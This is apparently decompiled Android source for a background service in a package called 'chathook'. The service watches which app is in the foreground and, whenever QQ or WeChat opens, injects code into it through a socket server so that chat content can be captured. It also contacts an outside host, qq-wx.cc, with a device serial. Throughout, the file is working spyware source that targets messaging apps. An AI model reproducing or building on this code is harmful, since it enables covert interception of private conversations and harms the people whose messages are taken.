package com.example.chathook;

import android.app.ActivityManager;
import android.app.ActivityManager.RecentTaskInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import com.example.chathook.utils.MActivityManagerNative;
import com.example.chathook.utils.MIActivityManager;
import java.io.IOException;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class ProcessMonitor extends Service {
    public static final String ACTION_ACTIVITY_SWITCH = "com.lenovo.safecenter.activityswitch";
    public static final String ACTION_ACTIVITY_SWITCH_2 = "com.qyin.activityswitch2";
    private static final String TAG = "ProcesMonitor";
    public static boolean isRun = true;
    /* access modifiers changed from: private|static */
    public static Context mContext;
    /* access modifiers changed from: private */
    public Object acNative;
    /* access modifiers changed from: private */
    public ActivityManager am;
    private BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(final Context context, Intent intent) {
            String action = intent.getAction();
            Log.i("yincc", "service action = " + action);
            if (ProcessMonitor.ACTION_ACTIVITY_SWITCH_2.equals(action)) {
                String newPkg = intent.getStringExtra("newPkg");
                String oldPkg = intent.getStringExtra("oldPkg");
                if (!TextUtils.isEmpty(newPkg)) {
                    Log.i("yincc", "pkg---->" + newPkg);
                    if (newPkg.equals("com.tencent.mobileqq") || newPkg.equals("com.tencent.mm")) {
                        String servername;
                        if (newPkg.equals("com.tencent.mobileqq")) {
                            servername = InjectApplicaiton.QQ_SOCKET_SERVER;
                        } else {
                            servername = InjectApplicaiton.MM_SOCKET_SERVER;
                        }
                        new Handler().postAtFrontOfQueue(new Runnable() {
                            public void run() {
                                Log.i("yincc", "post time");
                                if (InjectUtils.ConnectToServer(servername)) {
                                    Log.i("yincc", " already inject !!");
                                } else {
                                    InjectUtils.doInject(context, servername);
                                }
                            }
                        });
                    }
                }
            } else if ("learn.yincc.CHAT_UPDATE".equals(action)) {
                boolean history = intent.getBooleanExtra("history", false);
                intent.getStringExtra("chat");
            }
        }
    };
    private MyThread mythread = null;
    /* access modifiers changed from: private */
    public String oldPkg = "";
    /* access modifiers changed from: private */
    public String oldPkg2 = "";
    /* access modifiers changed from: private */
    public int overtime = 0;
    /* access modifiers changed from: private */
    public String runPkg = "";
    /* access modifiers changed from: private */
    public String topPkg = "";

    class MyThread extends Thread {
        private String servername;
        private String sn;

        MyThread() {
        }

        public void run() {
            Log.i("yincc", " Thread name = " + getName());
            List<RunningTaskInfo> rti;
            if (VERSION.SDK_INT < 14) {
                Log.i(ProcessMonitor.TAG, "doInBackground-->  <14");
                while (ProcessMonitor.isRun) {
                    try {
                        Thread.sleep(2000);
                        rti = MIActivityManager.getTasks(ProcessMonitor.this.acNative, 1, 0);
                        if (rti.size() > 0) {
                            ProcessMonitor.this.runPkg = ((RunningTaskInfo) rti.get(0)).topActivity.getPackageName();
                            Log.i("yincc", "oldPkg=" + ProcessMonitor.this.oldPkg);
                            if (!ProcessMonitor.this.oldPkg.equals(ProcessMonitor.this.runPkg)) {
                                Log.i("yincc", "runPkg=" + ProcessMonitor.this.runPkg);
                                if (ProcessMonitor.this.runPkg.equals("com.tencent.mobileqq") || ProcessMonitor.this.runPkg.equals("com.tencent.mm")) {
                                    Log.i("ligan", "overtime:" + ProcessMonitor.this.overtime);
                                    if (ProcessMonitor.this.runPkg.equals("com.tencent.mobileqq")) {
                                        this.servername = InjectApplicaiton.QQ_SOCKET_SERVER;
                                        this.sn = InjectApplicaiton.QQSN;
                                    } else {
                                        this.servername = InjectApplicaiton.MM_SOCKET_SERVER;
                                        this.sn = InjectApplicaiton.MMSN;
                                    }
                                    if (!InjectUtils.ConnectToServer(this.servername)) {
                                        Log.i("ligan", " not inject sleep 10 m!!");
                                        Thread.sleep(10000);
                                        Log.i("yincc", " not inject sleep 10 m!!end ");
                                        sendBroadcast("recentTask", ProcessMonitor.this.runPkg, ProcessMonitor.this.oldPkg);
                                    }
                                }
                                ProcessMonitor.this.oldPkg = ProcessMonitor.this.runPkg;
                            }
                        }
                    } catch (SecurityException e) {
                        Log.i(ProcessMonitor.TAG, "doInBackground error:" + e);
                    } catch (InterruptedException e2) {
                        e2.printStackTrace();
                    }
                }
                return;
            }
            Log.i(ProcessMonitor.TAG, "doInBackground-->  >14");
            while (ProcessMonitor.isRun) {
                try {
                    Thread.sleep(2000);
                    rti = MIActivityManager.getTasks(ProcessMonitor.this.acNative, 1, 0);
                    if (rti.size() > 0) {
                        ProcessMonitor.this.runPkg = ((RunningTaskInfo) rti.get(0)).topActivity.getPackageName();
                        if (!ProcessMonitor.this.oldPkg.equals(ProcessMonitor.this.runPkg)) {
                            Log.i(ProcessMonitor.TAG, "old" + ProcessMonitor.this.oldPkg + "------------new:" + ProcessMonitor.this.runPkg);
                            ProcessMonitor.this.oldPkg = ProcessMonitor.this.runPkg;
                        }
                    }
                    List<RecentTaskInfo> recentTasks = ProcessMonitor.this.am.getRecentTasks(1, 1);
                    if (recentTasks != null && recentTasks.size() > 0) {
                        ProcessMonitor.this.topPkg = ((RecentTaskInfo) recentTasks.get(0)).baseIntent.getComponent().getPackageName();
                        if (!ProcessMonitor.this.oldPkg2.equals(ProcessMonitor.this.topPkg)) {
                            if (ProcessMonitor.this.topPkg.equals("com.tencent.mobileqq") || ProcessMonitor.this.topPkg.equals("com.tencent.mm")) {
                                if (ProcessMonitor.this.topPkg.equals("com.tencent.mobileqq")) {
                                    this.servername = InjectApplicaiton.QQ_SOCKET_SERVER;
                                    this.sn = InjectApplicaiton.QQSN;
                                } else {
                                    this.servername = InjectApplicaiton.MM_SOCKET_SERVER;
                                    this.sn = InjectApplicaiton.MMSN;
                                }
                                if (!InjectUtils.ConnectToServer(this.servername)) {
                                    Log.i("yincc", " not inject sleep 10 m!!");
                                    Thread.sleep(10000);
                                    Log.i("yincc", " not inject sleep 10 m!! end ");
                                    sendBroadcast("recentTask", ProcessMonitor.this.topPkg, ProcessMonitor.this.oldPkg2);
                                }
                            }
                            ProcessMonitor.this.oldPkg2 = ProcessMonitor.this.topPkg;
                        }
                    }
                } catch (SecurityException e3) {
                    Log.i(ProcessMonitor.TAG, "doInBackground error:" + e3);
                    e3.printStackTrace();
                } catch (InterruptedException e22) {
                    e22.printStackTrace();
                }
            }
        }

        private void sendBroadcast(Object... values) {
            String action = "";
            if (values[0].equals("runningTask")) {
                action = ProcessMonitor.ACTION_ACTIVITY_SWITCH;
            } else {
                action = ProcessMonitor.ACTION_ACTIVITY_SWITCH_2;
            }
            Log.i(ProcessMonitor.TAG, values[0] + "------------action:" + action + " " + values[1] + " " + values[2]);
            Intent i = new Intent(action);
            i.putExtra("newPkg", (String) values[1]);
            i.putExtra("oldPkg", (String) values[2]);
            ProcessMonitor.mContext.sendBroadcast(i);
            Log.i(ProcessMonitor.TAG, values[0] + "------------end");
        }
    }

    public void onCreate() {
        super.onCreate();
        mContext = this;
        this.am = (ActivityManager) getSystemService("activity");
        this.acNative = MActivityManagerNative.getDefault();
        IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_ACTIVITY_SWITCH_2);
        registerReceiver(this.mReceiver, filter);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        execute();
        return super.onStartCommand(intent, flags, startId);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void execute() {
        isRun = true;
        if (this.mythread == null) {
            this.mythread = new MyThread();
            this.mythread.start();
        }
    }

    public void cancel() {
        isRun = false;
    }

    public int getOvertime(String sn) {
        String httpUrl = "http://www.qq-wx.cc/getovertime.php?SN=" + sn;
        Log.i("ligan", "get overtime url" + httpUrl);
        try {
            HttpResponse httpResponse = new DefaultHttpClient().execute(new HttpGet(httpUrl));
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                try {
                    return Integer.parseInt(EntityUtils.toString(httpResponse.getEntity()));
                } catch (NumberFormatException e) {
                    Log.i("ligan", e.getMessage().toString());
                }
            }
        } catch (ClientProtocolException e2) {
            Log.i("ligan", e2.getMessage().toString());
        } catch (IOException e3) {
            Log.i("ligan", e3.getMessage().toString());
        } catch (Exception e4) {
            Log.i("ligan", e4.getMessage().toString());
        }
        return 0;
    }
}
